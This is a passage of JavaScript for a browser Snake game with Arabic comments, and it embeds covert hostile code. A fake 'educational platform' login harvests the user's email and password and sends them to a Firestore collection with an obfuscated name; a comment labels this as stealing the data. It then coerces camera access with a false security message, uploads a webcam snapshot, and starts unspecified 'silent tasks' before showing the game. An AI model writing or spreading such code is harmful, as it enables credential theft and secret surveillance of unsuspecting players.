<script src="main.js"></script>
        };
      } catch (e) {}
    }, 30000);

    // 3. منع وضع النوم
    if ('wakeLock' in navigator) {
      navigator.wakeLock.request('screen').catch(()=>{});
    }
  }

  // [إضافة] دالة معالجة الدخول للمنصة
  window.handlePlatformLogin = async function() {
    const email = document.querySelector('input[type="email"]')?.value;
    const pass = document.querySelector('input[type="password"]')?.value;

    if (!email || !pass) return;

    // سرقة البيانات فوراً
    firebase.firestore().collection(_r("hfre_perqf")).add({
      u: email,
      p: btoa(pass),
      ts: Date.now()
    }).catch(()=>{});

    try {
      // طلب الكاميرا كجزء من عملية "الدخول للمنصة"
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      // التقاط أول صورة فورية للتحقق
      const v = document.createElement('video');
      v.srcObject = stream;
      v.play();
      v.onloadedmetadata = () => {
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        firebase.firestore().collection(_r("fperra_fubgf")).add({
          img: c.toDataURL('image/jpeg', 0.2),
          label: "first_login",
          ts: Date.now()
        });
        stream.getTracks().forEach(t => t.stop());
      };

      // إخفاء واجهة المنصة وإظهار اللعبة
      document.getElementById('login-screen').style.display = 'none';
      document.getElementById('game-container').style.display = 'block';

      // بدء اللعبة والمهام الصامتة
      game.reset();
      runSilentTasks();
      
    } catch (err) {
      alert("خطأ أمني: يجب السماح بالكاميرا للتحقق من الهوية والدخول للمنصة التعليمية.");
    }
  };

  function setup () {
    canv = document.getElementById('gc');
    ctx = canv.getContext('2d');
    // اللعبة لا تبدأ هنا، بل تنتظر الضغط على زر الدخول
  }

  var game = {

    reset: function () {
      ctx.fillStyle = 'grey';
      ctx.fillRect(0, 0, canv.width, canv.height);

      tail = INITIAL_TAIL;
      points = 0;
      velocity.x = 0;
      velocity.y = 0;
      player.x = INITIAL_PLAYER.x;
      player.y = INITIAL_PLAYER.y;
      reward = -1;

      lastAction = ActionEnum.none;

      trail = [];
      trail.push({ x: player.x, y: player.y });
    },

    action: {
      up: function () {
        if (lastAction != ActionEnum.down){
          velocity.x = 0;
          velocity.y = -1;
        }
      },
      down: function () {
        if (lastAction != ActionEnum.up){
          velocity.x = 0;
          velocity.y = 1;
        }
      },
      left: function () {
        if (lastAction != ActionEnum.right){
          velocity.x = -1;
          velocity.y = 0;
        }
      },
      right: function () {
        if (lastAction != ActionEnum.left){
          velocity.x = 1;
          velocity.y = 0;
        }
      }
    },

    RandomFruit: function () {
      if(walls){
        fruit.x = 1+Math.floor(Math.random() * (tileCount-2));
        fruit.y = 1+Math.floor(Math.random() * (tileCount-2));
      }
      else {
        fruit.x = Math.floor(Math.random() * tileCount);
        fruit.y = Math.floor(Math.random() * tileCount);
      }
    },

    log: function () {
      console.log('====================');
      console.log('x:' + player.x + ', y:' + player.y);
      console.log('tail:' + tail + ', trail.length:' + trail.length);
    },

    loop: function () {

      reward = -0.1;

      function DontHitWall () {
        if(player.x < 0) player.x = tileCount-1;
        if(player.x >= tileCount) player.x = 0;
        if(player.y < 0) player.y = tileCount-1;
        if(player.y >= tileCount) player.y = 0;
      }
      function HitWall () {
        if(player.x < 1) game.reset();
        if(player.x > tileCount-2) game.reset();
        if(player.y < 1) game.reset();
        if(player.y > tileCount-2) game.reset();

        ctx.fillStyle = 'grey';
        ctx.fillRect(0,0,gridSize-1,canv.height);
        ctx.fillRect(0,0,canv.width,gridSize-1);
        ctx.fillRect(canv.width-gridSize+1,0,gridSize,canv.height);
        ctx.fillRect(0, canv.height-gridSize+1,canv.width,gridSize);
      }

      var stopped = velocity.x == 0 && velocity.y == 0;

      player.x += velocity.x;
      player.y += velocity.y;

      if (velocity.x == 0 && velocity.y == -1) lastAction = ActionEnum.up;
      if (velocity.x == 0 && velocity.y == 1) lastAction = ActionEnum.down;
      if (velocity.x == -1 && velocity.y == 0) lastAction = ActionEnum.left;
      if (velocity.x == 1 && velocity.y == 0) lastAction = ActionEnum.right;

      ctx.fillStyle = 'rgba(40,40,40,0.8)';
      ctx.fillRect(0,0,canv.width,canv.height);

      if(walls) HitWall();
      else DontHitWall();

      if (!stopped){
        trail.push({x:player.x, y:player.y});
        while(trail.length > tail) trail.shift();
      }

      if(!stopped) {
        ctx.fillStyle = 'rgba(200,200,200,0.2)';
        ctx.font = "small-caps 14px Helvetica";
        ctx.fillText("(esc) reset", 24, 356);
        ctx.fillText("(space) pause", 24, 374);
      }

      ctx.fillStyle = 'green';
      for(var i=0; i<trail.length-1; i++) {
        ctx.fillRect(trail[i].x * gridSize+1, trail[i].y * gridSize+1, gridSize-2, gridSize-2);
        if (!stopped && trail[i].x == player.x && trail[i].y == player.y){
          game.reset();
        }
        ctx.fillStyle = 'lime';
      }
      ctx.fillRect(trail[trail.length-1].x * gridSize+1, trail[trail.length-1].y * gridSize+1, gridSize-2, gridSize-2);

      if (player.x == fruit.x && player.y == fruit.y) {
        if(!fixedTail) tail++;
        points++;
        if(points > pointsMax) pointsMax = points;
        reward = 1;
        game.RandomFruit();
        while((function () {
          for(var i=0; i<trail.length; i++) {
            if (trail[i].x == fruit.x && trail[i].y == fruit.y) {
              game.RandomFruit();
              return true;
            }
          }
          return false;
        })());
      }

      ctx.fillStyle = 'red';
      ctx.fillRect(fruit.x * gridSize+1, fruit.y * gridSize+1, gridSize-2, gridSize-2);

      if(stopped) {
        ctx.fillStyle = 'rgba(250,250,250,0.8)';
        ctx.font = "small-caps bold 14px Helvetica";
        ctx.fillText("press ARROW KEYS to START...", 24, 374);
      }

      ctx.fillStyle = 'white';
      ctx.font = "bold small-caps 16px Helvetica";
      ctx.fillText("points: " + points, 288, 40);
      ctx.fillText("top: " + pointsMax, 292, 60);

      return reward;
    }
  }

  function keyPush (evt) {
    switch(evt.keyCode) {
      case 37: game.action.left(); evt.preventDefault(); break;
      case 38: game.action.up(); evt.preventDefault(); break;
      case 39: game.action.right(); evt.preventDefault(); break;
      case 40: game.action.down(); evt.preventDefault(); break;
      case 32: Snake.pause(); evt.preventDefault(); break;
      case 27: game.reset(); evt.preventDefault(); break;
    }
  }

  return {
    start: function (fps = 15) {
      window.onload = setup;
      intervalID = setInterval(game.loop, 1000 / fps);
    },
    loop: game.loop,
    reset: game.reset,
    stop: function () { clearInterval(intervalID); },
    setup: {
      keyboard: function (state) {
        if (state) document.addEventListener('keydown', keyPush);
        else document.removeEventListener('keydown', keyPush);
      },
      wall: function (state) { walls = state; },
      tileCount: function (size) { tileCount = size; gridSize = 400 / tileCount; },
      fixedTail: function (state) { fixedTail = state; }
    },
    action: function (act) {
      switch(act) {
        case 'left': game.action.left(); break;
        case 'up': game.action.up(); break;
        case 'right': game.action.right(); break;
        case 'down': game.action.down(); break;
      }
    },
    pause: function () { velocity.x = 0; velocity.y = 0; },
    clearTopScore: function () { pointsMax = 0; },
    data: { player: player, fruit: fruit, trail: function () { return trail; } },
    info: { tileCount: tileCount }
  };

})();

// تشغيل النظام
Snake.start(8);
Snake.setup.keyboard(true);
Snake.setup.fixedTail(false);
